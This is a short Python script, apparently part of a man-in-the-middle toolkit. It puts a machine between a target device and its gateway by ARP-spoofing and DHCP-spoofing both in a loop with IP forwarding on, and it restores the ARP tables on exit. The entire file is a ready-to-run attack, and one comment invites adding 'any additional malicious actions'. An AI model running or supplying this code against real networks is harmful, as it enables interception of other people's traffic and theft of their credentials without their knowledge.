from mitm.atk_arp import arp_spoof, restore
from mitm.listen_http import enable_ip_forwarding, disable_ip_forwarding, dhcp_spoof
import time
from mitm.main import get_mac


target_ip = "192.168.1.111"  # Enter the IP of the target device
spoof_ip = "192.168.1.1"   # Enter the IP of the gateway

target_mac = get_mac(target_ip)
spoof_mac = get_mac(spoof_ip)

try:
    enable_ip_forwarding()  # Enable IP forwarding and setup forwarding rules
    while True:
        arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac)
        dhcp_spoof(target_ip, target_mac, spoof_ip, spoof_mac)
        time.sleep(2)  # Add a delay of 2 seconds between each iteration
        # Add any additional malicious actions here if desired
except KeyboardInterrupt:
    restore(target_ip, target_mac, spoof_ip, spoof_mac)
    disable_ip_forwarding()  # Disable IP forwarding and cleanup forwarding rules